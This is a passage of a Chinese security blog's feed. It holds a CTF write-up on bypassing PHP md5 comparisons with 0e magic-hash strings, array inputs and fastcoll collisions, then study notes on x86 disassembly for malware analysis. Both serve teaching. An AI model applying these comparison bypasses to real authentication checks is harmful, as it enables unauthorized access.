    <link href="https://kabeor.github.io/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://kabeor.github.io/对强网杯2018“Web签到”的思考/</id>
    <published>2018-03-29T11:50:54.379Z</published>
    <updated>2018-06-07T11:23:28.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对强网杯2018“Web签到”的思考"><a href="#对强网杯2018“Web签到”的思考" class="headerlink" title="对强网杯2018“Web签到”的思考"></a>对强网杯2018“Web签到”的思考</h1><p>题目地址：  <a href="http://39.107.33.96:10000/" target="_blank" rel="noopener">http://39.107.33.96:10000/</a></p><p>题目共分为三层</p><ol><li>PHP处理0e开头的md5哈希字符串的缺陷</li><li>MD5函数不能处理数组</li><li>字符串md5碰撞<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/3mhi6iH3Bl.png?imageslim" alt="mark"><br>我们查看源码，可以找到<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/bfBe4BK4FE.png?imageslim" alt="mark"></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])==md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里PHP在处理哈希字符串时，利用”==”来对哈希值进行比较，把每一个以”0E”开头的哈希值都解释为0，因此如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么PHP将会认为它们都是0。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在PHP中，e可以指幂，因此</p><pre><code>0e123456   等价于   0*10^123456</code></pre><p>0乘任何数等于零，因此0e开头的md5全部等于0，也就做到了这里的</p><pre><code>md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]</code></pre><p>这里我使用的是</p><blockquote><p>s878926199a     md5: 0e545993274517709034328855841020<br>s155964671a     md5: 0e342768416822451524974117254469</p></blockquote><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/8fcddm24D0.png?imageslim" alt="mark"><br>查看源码<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/5kedl7BIel.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里变成了===操作符，严格等于，因此我们无法利用0e<br>因此我们需要符合的条件为构建两个参数 使得他们类型或者值不相同 但哈希值相同</p><p>这里我们考虑到，PHP的md5函数用法如下</p><pre><code>md5(string,raw)</code></pre><blockquote><p>string    必需。规定要计算的字符串。</p><p>raw<br>可选。规定十六进制或二进制输出格式：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数</p><p>返回值：    如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。</p></blockquote><p>因此，如果md5中的参数不是字符串（string），则会返回null<br>所以如果我们传入两个值不同的数组，就会出现</p><pre><code>null===null</code></pre><p>符合条件</p><p>使用Burpsuite抓包，传数组<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/BGA575Im5h.png?imageslim" alt="mark"></p><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/1a3KL15gfa.png?imageslim" alt="mark"><br>源码<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/jfg1H3487G.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这次PHP将两个参数强行转成string.</p><p>没有漏洞，我们只能考虑md5碰撞</p><h3 id="原理（个人理解，如有错误请指正）"><a href="#原理（个人理解，如有错误请指正）" class="headerlink" title="原理（个人理解，如有错误请指正）"></a>原理（个人理解，如有错误请指正）</h3><p>2005年王小云提出了md5哈希碰撞，公式如下</p><pre><code>f(f(s, M), M&apos;) = f(f(s, N), N&apos;)</code></pre><p>先将明文进行64bit分组，不足的则填充，这样它的长度将是64字节的倍数。</p><p>接下来将其分为单个的64bit字节块M0, M1, …, Mn-1。</p><p>而md5的hash是由16字节的序列s0, …, sn来计算。计算规则为：si+1 = f(si, Mi) ，（i为角标）， f是一个固定函数。s0是初始化向量，sn是最终状态，即计算的md5 hash</p><p>对于给定的初始化向量s，找出两组M，M’和N，N’，使得f（f（s，M），M’）= f（f（s，N），N’）  ，重要的是这里不仅仅适用于标准初始化矢量s0，而对于任何初始化矢量s都适用。</p><p>也就是说对于两个不同的消息分组 M、N，s 相同，经过两次 f 函数后得到的结果是一样的。</p><p>因此可以找到任意长度的对文件，除了文件中间的128个字节，它们是相同的，而且它们具有相同的MD5散列。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180329/ba8gIeaH5i.png?imageslim" alt="mark"><br>为了便于理解，自己做了个图</p><p>m0 m1经过两次f函数所得的hash是相同的</p><p>如果对这个有兴趣，推荐下面的网站</p><p>md5相关知识： <a href="http://www.unixwiz.net/techtips/iguide-crypto-hashes.html" target="_blank" rel="noopener">http://www.unixwiz.net/techtips/iguide-crypto-hashes.html</a><br>可视化md5碰撞演示： <a href="http://www.links.org/?p=6" target="_blank" rel="noopener">http://www.links.org/?p=6</a><br>用相同的MD5散列创建两个PHP文件： <a href="https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html</a><br>Are there two known strings which have the same MD5 hash value?： <a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><p>我们使用md5碰撞软件fastcoll生成两个md5相同的文件，经url编码后上传即可得到flag。</p><p>From <a href="https://kabeor.github.io/对强网杯2018“Web签到”的思考/">https://kabeor.github.io/对强网杯2018“Web签到”的思考/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;a href=&quot;#对强网杯2018“Web签到”的思考&quot; class=&quot;headerlink&quot; title=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;/a&gt;对强网杯2018“Web签到”的思考&lt;/h1&gt;&lt;p&gt;题目地址： 
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
      <category term="WriteUP" scheme="https://kabeor.github.io/categories/Web/WriteUP/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="web" scheme="https://kabeor.github.io/tags/web/"/>
    
      <category term="PHP漏洞" scheme="https://kabeor.github.io/tags/PHP%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="md5" scheme="https://kabeor.github.io/tags/md5/"/>
    
  </entry>
  
  <entry>
    <title>第4章 x86反汇编速成班</title>
    <link href="https://kabeor.github.io/%E7%AC%AC4%E7%AB%A0%20x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/"/>
    <id>https://kabeor.github.io/第4章 x86反汇编速成班/</id>
    <published>2018-03-23T05:56:19.767Z</published>
    <updated>2018-06-07T11:23:55.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第4章-x86反汇编速成班"><a href="#第4章-x86反汇编速成班" class="headerlink" title="第4章 x86反汇编速成班"></a>第4章 x86反汇编速成班</h1><h2 id="4x1-抽象层次"><a href="#4x1-抽象层次" class="headerlink" title="4x1 抽象层次"></a>4x1 抽象层次</h2><blockquote><p>恶意代码分析时的三种编码层次<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/kkHfCGCLcJ.png?imageslim" alt="mark"></p><p>计算机系统的六个抽象层次</p></blockquote><p><strong>硬件</strong>   硬件层是唯一的一个物理层，由电子电路组成。这些电路实现了XOR门、AND门、OR门和NOT门等逻辑运算器的复杂组合，称为数字逻辑（digital logic）。由于物理特性，硬件很难被软件所操纵。</p><p><strong>微指令</strong>  微指令层又称为固件（firmware）。微指令只能在为它设计的特定电路上执行。这层由一些微指令构成，它们从更高的机器码层翻译而来，提供了访问硬件的接口。当分析恶意代码时，我们通常不关心微指令，因为它们通常是为特定的计算机硬件设计的。</p><p><strong>机器码</strong>  机器码层由操作码（opcode ）组成，操作码是一 些十六进制形式的数字，用于告诉处理器你想要它做什么。机器码一般由多条微指令实现，这样底层硬件就能实际执行代码了。而机器码本身又由高级语言编写的计算机程序编译而来。</p><p><strong>低级语言</strong>  低级语言是计算机体系结构指令集的人类易读版本，主要是汇编语言。恶意代码分析师使用这一层，因为对人来说，机器码太难理解了。我们使用反汇编器来生成低级语言的文本，这些文本由一些简单的助记符组成，如mov和jmp。</p><p><strong>高级语言</strong> 大部分程序员使用高级语言。高级语言对机器层做了很强的抽象，从而可以很轻松地使用程序逻辑和流控制机制。高级语言包括C、C＋＋等。它们被一个编译器经过称为编译的过程转化为机器码。</p><p><strong>解释性语言</strong>  解释型语言位于最高层。很多程序员使用诸如C＃、Perl、.NET、Java等解释语言。这一层的代码不会被编译为机器码，而是被翻译为了字节码。字节码 （bytecode）是特定于该语言的一种中间表示，它在解释器中执行。解释器（interpreter）是一个在运行时将字节码实时翻译为可执行机器码的程序。相比于传统被编译的代码，解释器提供了一种自动的抽象层次，因为它可以独立于操作系统，自己处理错误和管理内存。</p><h2 id="4x2-逆向工程"><a href="#4x2-逆向工程" class="headerlink" title="4x2 逆向工程"></a>4x2 逆向工程</h2><blockquote><p>恶意代码存储在磁盘上时，通常是机器码层的二进制形式。前面提到，机器码是一种计算机可以快速高效执行的代码形式。而我们反汇编恶意代码，就是使用反汇编器（disassembler），将恶意代码二进制文件作为输入，输出汇编语言代码。</p><p>汇编语言实际上是一类语言的统称。每种汇编语言的方言，都是用来对一 类微处理器家族编程的，例如，x86、x64、SPARC、PowerPC、MIPS、ARM 等。目前，x86是PC上最流行的体系结构。</p><p>x86，又称为IntelIA-32，是大部分32位PC使用的体系结构，微软目前所有的32位Windows系统也都运行在 x86上。此外，大部分运行在AM D64和Intel64体系结构上的W indows也都支持x86的32位二进制程序。正因如此，大部分恶意代码是为x86编译的。</p></blockquote><h2 id="4x3-x86体系结构"><a href="#4x3-x86体系结构" class="headerlink" title="4x3 x86体系结构"></a>4x3 x86体系结构</h2><p>大部分现代计算机体系结构（包括x86）在内部实现上遵循冯·诺依曼结构。这种结构包含3种硬件组件：</p><blockquote><p>•    中央处理单元（ CPU ），负责执行代码<br>•    内存（RAM），负责存储所有的数据和代码。<br>•    输入／输出系统（IO），为硬盘、键盘、显示器等设备提供接口。</p></blockquote><p>指针（instruction pointer）的寄存器（register）从内存取得要执行的指令，这个寄存器中存有指令的地址。寄存器是CPU中数据的基本存储单元，通过它，很多时候CPU不再需要访问内存，从而节省了时间。算术逻辑单元（arithmetic logic unit, ALU）执行从内存取来的指令，并将结果放到寄存器或内存中。一条条取指令、执行指令的过程不断重复，就形成了程序的运行。</p><p>冯诺依曼体系结构<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/4cCbB7KD6A.png?imageslim" alt="mark"></p><h3 id="1-内存"><a href="#1-内存" class="headerlink" title="1.内存"></a>1.内存</h3><p>一个程序的内存可分为如下四个主要的节<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/al8j41eH4h.png?imageslim" alt="mark"></p><blockquote><p><strong>数据</strong> 这个词指的是内存中一 个特定的节，名为数据节 （data section），其中包含了一 些值。这些值在程序初始加载时被放到这里，称为静态值（static value），因为程序运行时它们可能并不发生变化，还可以称为全局值（global value），因为程序的任何部分都可以使用它们。</p><p><strong>代码</strong> 代码节包含了在执行程序任务时CPU所取得的指令。这些代码决定了程序是做什么的，以及程序中的任务如何协调工作。</p><p><strong>堆</strong> 堆是为程序执行期间需要的动态内存准备的，用于创建（分配）新的值，以及消除（释放）不再需要的值。将其称为动态内存（dynamic memory），是因为其内容在程序运行期间经常被改变。</p><p><strong>栈</strong> 栈用于函数的局部变量和参数，以及控制程序执行流。</p></blockquote><h3 id="2-指令"><a href="#2-指令" class="headerlink" title="2. 指令"></a>2. 指令</h3><p>指令是汇编程序的构成块。在x86、汇编语言中，一条指令由一个助记符，以及零个或多个操作数组成。</p><h3 id="3-操作码和字节序"><a href="#3-操作码和字节序" class="headerlink" title="3. 操作码和字节序"></a>3. 操作码和字节序</h3><p>每条指令使用操作码告诉CPU程序要执行什么样的操作。<br>反汇编器将操作码翻译为人类易读的指令。</p><p>数据的字节序（enclianness）是指在一个大数据项中，最高位（大端，big-endian）还是最低位（小端，little-enclian）被排在第一位 （即排在最低的地址上）。</p><h3 id="4-操作数"><a href="#4-操作数" class="headerlink" title="4. 操作数"></a>4. 操作数</h3><p>操作数说明指令要使用的数据。有以下三种类型：</p><blockquote><p>立即数（immediate）操作数是一个固定的值<br>寄存器（register）操作数指向寄存器<br>内存地址（memory address）操作数指向感兴趣的值所在的内存地址，一般由方括号内包含值、寄存器或方程式组成，如［eax］。</p></blockquote><h3 id="5-寄存器"><a href="#5-寄存器" class="headerlink" title="5. 寄存器"></a>5. 寄存器</h3><p>寄存器是可以被CPU使用的少量数据存储器，访问其中内容的速度会比访问其他存储器要快。x86处理器中有一组寄存器，可以用于临时存储或者作为工作区。</p><p>最常用的x86寄存器，可以将它们归为以下四类：</p><blockquote><p>通用寄存器，CPU在执行期间使用。<br>段寄存器，用于定位内存节。<br>状态标志，用于做出决定。<br>指令指针，用于定位要执行的下一条指令。</p></blockquote><p>x86寄存器<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/JLIk7jAm7C.png?imageslim" alt="mark"></p><p>所有通用寄存器的大小都是32位，可以在汇编代码中以32位或16位引用。</p><p>有4个寄存器（EAX、EBX、ECX、EDX）还可以8位值的方式引用，从而使用其最低的8位，或次低的8位。</p><p><strong>通用寄存器</strong>  通用寄存器一般用于存储数据或内存地址，而且经常交换着使用以完成程序。不过，虽然它们被称为通用寄存器，但它们并不完全通用。</p><p>一些x86指令只能使用特定的寄存器。例如，乘法和除法指令就只能使用EAX和EDX。</p><p><strong>标志寄存器</strong>  EFLAGS寄存器是一个标志寄存器。在x86架构中，它是32位的，每一位是一个标志。在执行期间，每一位表示要么是置位（值为1），要么是清除（值为0），并由这些值来控制CPU 的运算，或者给出某些CPU运算的值。</p><p>对恶意代码分析来说，最重要的一些标志介绍如下：</p><blockquote><p><strong>ZF</strong>  当一个运算的结果等于0时，ZF被置位，否则被清除。<br><strong>CF</strong>  当一个运算的结果相对于目标操作数太大或太小时，CF被置位，否则被清除。<br><strong>SF</strong>  当一 个运算的结果为负数，SF被置位；若结果为正数，SF被清除。对算术运算，当运算结果的最高位值为l时，SF也会被置位。<br><strong>TF</strong> TF用于调试。当它被置位时，x86处理器每次只执行一条指令。</p></blockquote><p><strong>EIP指令指针</strong><br>在x86架构中，EIP寄存器，又称为指令指针或程序计数器，保存了程序将要执行的下一条指令在内存中的地址。EIP的唯一作用就是告诉处理器接下来要做什么。</p><blockquote><p>注意：当EIP被破坏（即指向了一个不包含合法程序代码的内存地址 ）时，CPU 无法取得一条合法指令来执行，此时正在运行的程序就可能崩溃。当你控制了EIP，也就控制了CPU将要执行什么，这也就是为什么攻击者试图通过漏洞利用获得对EIP的控制。通常，攻击者先妥使攻击代码进入内存，然后改变EIP使其指向那段代码，从而攻击系统。</p></blockquote><h3 id="6-简单指令"><a href="#6-简单指令" class="headerlink" title="6. 简单指令"></a>6. 简单指令</h3><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a><strong>mov</strong></h4><p>用于将数据从一个位置移动到另一个位置</p><p>mov指令可以将数据移动到寄存器或内存，其格式是：mov destination, source</p><p>由方括号括起来的操作数是对内存中数据的引用。例如，［ebx]指向内存中地址为EBX处的数据。</p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a><strong>lea</strong></h4><p>lea指令用来将一个内存地址赋给目的操作数。</p><p> “load effective address“（加载有效地址）的缩写。它的格式是lea destination, source。</p><p>例如，lea eax, [ebx+8］就将EBX+8的值给EAX。</p><p>lea指令并非专门用于计算内存地址。它还被用来计算普通的值，因为它所需的指令更少。</p><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p>加法和减法是从目标操作数中加上或减去一个值。</p><p>加法指令的格式是add destination, value。</p><p>减法的指令是sub destination, value。<br>sub指令会修改两个重要的标志：ZF和CF。<br>如果结果为零，ZF被置位；如果目标操作数比要减去的值小，则CF被置位。</p><p>inc和dec指令将一个寄存器加一和减一 。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/dJcCLJkFdg.png?imageslim" alt="mark"></p><p>乘法和除法都使用了一个预先规定的寄存器，因此其指令很简单，就是指令码加上寄存器要去乘或除的值。</p><p>mul指令的格式是mul value;<br>div指令的格式是div value。</p><p>mul或div指令要操作的寄存器一般会在之前许多条指令的地方被赋值，因此你可能需要在程序的上下文中来寻找。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/bfi8k7H4gA.png?imageslim" alt="mark"></p><p>mul value指令总是将eax乘上value。因此，EAX寄存器必须在乘法指令出现前就赋值好。乘法的结果以64位的形式分开存储在两个寄存器中：EDX和EAX。其中，EDX存储了高的32位，EAX存储低的32位。</p><p>div value指令将EDX和EAX合起来存储的64位值除以value。因此，在做除法之前，EDX和EAX这两个寄存器必须赋值好。除法的商将存储到EAX，余数则存储在EDX中。</p><p><strong>模（mod）</strong>运算会被编译为在div指令后取EDX寄存器的值（因为除法保留了余数）</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>x86架构还使用逻辑运算符，例如OR、AND和XOR。其相应指令的用法与add和sub类似，对源操作数和目的操作数做相应的操作，并将结果保存在目的操作数中。</p><p><em>xor eax, eax就一种将EAX寄存器快速置0的方法。这么做是为了优化，因为这条指令只需要2个字节，而mov eax, 0需要5个字节。</em></p><p>shr和shl指令用于对寄存器做移位操作。</p><p>shr指令的格式是 “shr destination, count”<br>shl指令的格式是 “shl destination, count” </p><p>shr和shl指令对目的操作数右移或左移，由count决定移多少位。移出目的操作数边界的位则会先移动到CF标志位中。在移位时，使用0填充新的位。移位运算全部完成后，CF标志位中就包含了最后移出目的操作数的那一位。</p><p>循环移位指令ror和rol与移位指令类似，但移出的那一位会被填到另一端空出来的位上，即右循环移位（ror）会将最低位循环移到最高位；左循环移位Crol)则相反。</p><p>移位经常被用于对乘法运算的优化。由于不需要像乘法那样设置寄存器、移动数据，移位会更简单、更快。</p><p>在分析恶意代码时，如果遇到一个函数中只有xor、or、and、shl、ror、shr、rol这样的指令，并且它们反复出现，看起来随机排列的样子，就可能是遇到了一个加密或者压缩函数。最好是将其标记为一个加密函数，然后继续后面的分析。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/GiE8HfLKi8.png?imageslim" alt="mark"></p><h4 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a><strong>NOP指令</strong></h4><p>当它出现时，直接执行下一条指令。</p><p>这条指令的opcode是Ox90。在缓冲区溢出攻击中，当攻击者无法完美地控制利用代码，就经常使用NOP滑板。它起到了填充代码的作用，以降低shellcode可能在中间部分开始执行所造成的风险。</p><h3 id="7-栈"><a href="#7-栈" class="headerlink" title="7. 栈"></a>7. 栈</h3><p>用于函数的内存、局部变量、流控制结构等被存储在栈中。</p><p>栈是一种用压和弹操作来刻画的数据结构，向战中压入一些东西，然后再把它们弹出来。</p><p>它是一种后入先出（LIFO）的结构。</p><p>与栈有关的指令包括push、pop、call、leave、enter、和ret。在内存中，栈被分配成自顶向下的，最高的地址最先被使用。当一个值被压入战时，使用低一点的地址。</p><p>栈只能用于短期存储。它经常用于保存局部变量、参数和返回地址。其主要用途是管理函数调用之间的数据交换。而不同的编译器对这种管理方法的具体实现有所不同，但大部分常见约定都使用相对EBP的地址来引用局部变量与参数。</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>许多函数包含一 段 “序言” （prologue），它是在函数开始处的少数几行代码，用于保存函数中要用到的栈和寄存器。相应的，在函数结尾的 “结语” （epilogue）则将技和这些寄存器恢复至函数被调用前的状态。</p><p>下面列举了函数调用最常见的实现流程</p><blockquote><ol><li>使用push指令将参数压入栈中。</li><li>使用call memory_location来调用函数。此时，当前指令地址（指EIP寄存器中的内容）被压入栈中。这个地址会在函数结束后，被用于返回到主代码。当函数开始执行时，EIP的值被设为memory_location （即函数的起始地址）。</li><li>通过函数的序言部分，分配栈中用于局部变量的空间，EBP （基址指针）也被压入栈中。这样就达到了为调用函数保存EBP的目的。</li><li>函数开始做它的工作。</li><li>通过函数的结语部分，恢复。调整E回来释放局部变量，恢复EBP，以使得调用函数可以准确地定位它的变量。leave指令可以用作结语，因为它的功能是使ESP等于EBP，然后从栈中弹出EBP。</li><li>函数通过调用ret指令返回。这个指令会从栈中弹出返回地址给EIP，因此程序会从原来调用的地方继续执行。</li><li>调整栈，以移除此前压入的参数，除非它们在后面还要被使用。</li></ol></blockquote><p>x86架构还提供了其他弹出和压入的指令，其中最常用的是pusha和pushad。它们将所有的寄存器都压入战中，并且常与popa和popad结合使用，后者从栈中弹出所有的寄存器。</p><p>pusha和pushad的具体功能如下。</p><blockquote><p>•    pusha以下面的顺序将所有16位寄存器压入栈中：AX、EX、DX 、BX 、SP、BP、SI、DI<br>• pushad以下面的顺序将所有32位寄存器压入栈中：EAX、ECX 、EDX 、EBX 、ESP、EBP、ESI、 EDI</p></blockquote><p><em>在shellcode中，如果要将寄存器的当前状态全部保存在栈上，以便稍后恢复，就常使用这些指令。编译器很少使用它们，因此，看到它们，通常说明是某人手工写的汇编代码或者shellcode。</em></p><h3 id="8-条件指令"><a href="#8-条件指令" class="headerlink" title="8. 条件指令"></a>8. 条件指令</h3><p>最常见的两个条件指令是test和cmp。</p><p>test指令与and指令的功能一样，但它并不会修改其使用的操作数。test指令只设置标志位。</p><p>对某个东西与它自身的test经常被用于检查它是否是一个NULL值。</p><p>cmp指令与sub指令的功能一样，但它不影响其操作数。cmp指令也是只用于设置标志位，其执行结果是，ZF和CF标志位可能发生变化。</p><h3 id="9-分支指令"><a href="#9-分支指令" class="headerlink" title="9. 分支指令"></a>9. 分支指令</h3><p>最常见的分支指令是跳转指令。程序中使用了大量的跳转指令，其中最简单的是jmp指令，它使得下一条要被执行的指令是其格式jmp location中指定位置的指令，又被称为无条件跳转，因为总会跳到目的位置去执行。这个简单的跳转无法满足所有的跳转需求。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/FCgikAlbIf.png?imageslim" alt="mark"></p><h3 id="10-重复指令"><a href="#10-重复指令" class="headerlink" title="10. 重复指令"></a>10. 重复指令</h3><p>重复指令是一组操作数据缓冲区的指令。数据缓冲区通常是一个字节数组的形式，也可以是单字或者双字。</p><p>常见的数据缓冲区操作指令是movsx, cmpsx、stosx和scasx，其中x可以是b、w或者d，分别表示字节、字和双字。这些指令对任何形式的数据都有效。</p><p>在这些操作中，使用ESI和EDI寄存器。ESI是源索引寄存器，EDI是目的索引寄存器。还有ECX用作计数的变量。</p><p>这些指令还需要一 个前缀，用于对长度超过1的数据做操作。movsb指令本身只会移动一 个字节，而不使用ECX 寄存器。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/lf5EFg057c.png?imageslim" alt="mark"></p><p>在x86下，使用重复前缀来做多字节操作。rep指令会增加ESI和EDI这两个偏移，减少ECX寄存器。rep前缀会不断重复，直至ECX=O。repe／repz和repne/repnz前缀则不断重复，直至ECX=O或直至ZF= 1或0。</p><p>movsb指令用于将一串字节从一个位置移动到另一 个位置。rep前缀经常与movsb一起使用，从而复制一串长度由ECX 决定的字节。从逻辑上说，rep movsb指令等价于C语言的memcpy函数。movsb指令从ESI指向地址取出一 个字节，将其存入ED I指向地址，然后根据方向标志（DF）的设置，将ESI和EDI的值加1或者减1。如果DF=O，则加，否则减。</p><p>在由C代码编译后的结果中，很少能看到DF标志。但是在shellcode里，人们有时候会调换方向标志，这样就可以反方向存储数据。如果有rep前缀，就会检查ECX是否为0，如果不等于0，则指令继续从ESI移动一个字节到EDI并将ECX 寄存器减1。这个过程会不断重复，直至ECX=0。</p><p>cmpsb指令用于比较两串字节，以确定其是否是相同的数据。cmpsb指令用ESI指向地址的字节减去EDI指向地址的字节，并更新相关的标志位。它经常与repe前缀一起使用。此时，cmpsb指令逐一比较两串字节，直至发现一处不同，或比较到头。cmpsb指令从地址ESI获得一 个字节，将其与ED I指向位置的字节进行比较，并设置标志位，然后对ESI和EDI分别加1。如果有「epe前缀，就检查ECX的值和标志位，如果ECX=O或者ZF=O，就停止重复。这相当于C语言中的memcmp函数。</p><p>scasb指令用于从一串字节中搜索一 个值。这个值由AL寄存器给出。它的工作方式与cmpsb一样，但是它是将ESI指向地址的字节与AL进行比较，而不是与EDI指向地址的字节比较。repe操作会使得这个比较不断继续，直到找到该字节，或者ECX=O。如果在这串字节中找到了那个值，则其位置会被存储在ESI中。</p><p>stosb指令用于将值存储到EDI指向的地址。它与scasb一样，但不是去搜索，而是将指定的字节存入EDI指向的地址。rep前缀与scasb一起使用后，就初始化了一段内存缓冲区，其中的每个字节都是相同的值。这等价于C语言的memset函数。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/lbdC8beK1C.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/jDGe8LJai1.png?imageslim" alt="mark"></p><h3 id="11-C语言主函数和偏移"><a href="#11-C语言主函数和偏移" class="headerlink" title="11. C语言主函数和偏移"></a>11. C语言主函数和偏移</h3><p>一个标准C程序的主函数有两个参数，形式如下：<br><code>int main(int argc, char** argv)</code><br>参数argc和argv在运行时决定。其中，参数argc是一个整数，说明了命令行中参数的个数，包括程序名字本身：参数argv是一个字符串数据指针，指向了所有的命令行参数。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/m4JJAl5je5.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/IbmGBBKdE1.png?imageslim" alt="mark"></p><h3 id="12-更多信息：Intel×86-Architecture-Manual"><a href="#12-更多信息：Intel×86-Architecture-Manual" class="headerlink" title="12. 更多信息：Intel×86 Architecture Manual"></a>12. 更多信息：Intel×86 Architecture Manual</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/GKhf6el57H.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180323/CAh3B8cIcc.png?imageslim" alt="mark"></p><p>From <a href="https://kabeor.github.io/第4章 x86反汇编速成班/">https://kabeor.github.io/第4章 x86反汇编速成班/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第4章-x86反汇编速成班&quot;&gt;&lt;a href=&quot;#第4章-x86反汇编速成班&quot; class=&quot;headerlink&quot; title=&quot;第4章 x86反汇编速成班&quot;&gt;&lt;/a&gt;第4章 x86反汇编速成班&lt;/h1&gt;&lt;h2 id=&quot;4x1-抽象层次&quot;&gt;&lt;a href=&quot;#4
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
